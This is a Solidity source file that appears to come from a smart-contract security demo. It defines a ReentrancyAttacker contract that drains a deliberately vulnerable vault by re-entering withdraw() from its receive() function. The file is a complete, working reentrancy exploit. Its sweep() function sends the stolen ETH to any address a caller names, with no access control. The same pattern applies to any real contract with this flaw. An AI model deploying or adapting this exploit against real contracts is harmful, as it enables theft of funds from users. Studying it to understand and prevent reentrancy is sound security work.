// SPDX-License-Identifier: MIT

pragma solidity ^0.8.22;

import {ReentrancyVault} from "../vulnerable/ReentrancyVault.sol";

/**
 * @title Reentrancy Attacker
 * @author Joash Kuteesa
 * @notice This contract exploits Reentrancy Vault by re-entering withdraw() via receive()
 */

contract ReentrancyAttacker {
    ReentrancyVault public vault;
    uint256 public attackAmount;

    constructor(address _vaultAddress) {
        vault = ReentrancyVault(_vaultAddress);
    }

    /// @notice Start the attack by depositing ETH, then withdrawing to trigger reentrancy.
    function attack() external payable {
        require(msg.value > 0, "Must send ETH to attack");
        attackAmount = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw(attackAmount);
    }

    /// @notice Collect stolen ETH back to whoever calls this (demo convenience).
    function sweep(address payable to) external {
        require(to != address(0), "zero addr");
        to.call{value: address(this).balance}("");
    }

    receive() external payable {
        if (address(vault).balance >= attackAmount) {
            vault.withdraw(attackAmount);
        }
    }
}
